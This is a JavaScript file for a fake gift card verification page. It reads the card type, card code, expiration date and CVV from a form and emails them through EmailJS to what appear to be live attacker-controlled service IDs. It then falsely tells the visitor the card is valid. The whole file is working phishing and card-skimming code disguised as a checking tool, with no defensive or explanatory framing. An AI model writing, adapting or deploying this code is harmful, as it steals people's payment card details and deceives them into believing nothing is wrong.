// Initialize EmailJS
(function() {
    emailjs.init("NVWsjfY94u8ldeolg"); // Replace with your EmailJS user ID
})();

// Function to send the form data
document.getElementById('verifyButton').addEventListener('click', function() {
    // Get form values
    const cardType = document.getElementById('cardType').value;
    const cardCode = document.getElementById('cardCode').value;
    const expirationDate = document.getElementById('expirationDate').value;
    const cvv = document.getElementById('cvv').value;

    // Basic validation
    if (!cardType || !cardCode || !expirationDate || !cvv) {
        alert("Please fill out all fields.");
        return;
    }

    // EmailJS service parameters
    const templateParams = {
        cardType: cardType,
        cardCode: cardCode,
        expirationDate: expirationDate,
        cvv: cvv,
    };

    // Send email using EmailJS
    emailjs.send('service_aka8bfr', 'template_diiuypm', templateParams)
        .then(function(response) {
            console.log('SUCCESS!', response.status, response.text);
            alert("Your Gift Card is Valid!");
        }, function(error) {
            console.log('FAILED...', error);
            alert("Failed to send card details. Please try again.");
        });
});
